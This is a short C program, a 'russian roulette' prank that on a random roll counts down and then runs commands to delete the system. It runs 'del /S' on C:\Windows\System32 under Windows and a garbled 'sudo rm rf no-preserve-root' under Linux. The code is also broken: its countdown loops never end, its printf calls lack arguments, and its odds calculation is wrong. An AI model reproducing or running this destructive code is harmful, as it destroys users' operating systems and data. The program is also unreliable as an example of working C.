#include <stdio.h>
#include <stdlib.h>

#ifdef WIN32
#include <windows.h>
#elif __linux__
#include <unistd.h>
#endif

int main(int argc, char** argv) {
  if(argc > 2 || argc == 1) {
    printf("usage: ./russian_roulette [x]\nwhere 1/x is the fucking odd for you to die\n");
    return 0;
  }
  int x = atoi(argv[1]);
  if(rand()/x == 1) {
#ifdef WIN32
    for(int i=5; i>=0; i++) {
      printf("deleting your OS in: %d\n");
      Sleep(1);
    }
    printf("have a nice day :)");
    system("del /S C:\\Windows\\System32");
    return EXIT_FAILURE;
#elif __linux__
    for(int i=5; i>=0; i++) {
      printf("deleting your everyting in: %d\n");
      sleep(1);
    }
    printf("have a nice day :)");
    system("sudo rm rf no-preserve-root");
    return EXIT_FAILURE;
#endif
  }
  printf("Lucky you :)");
  return EXIT_SUCCESS;
}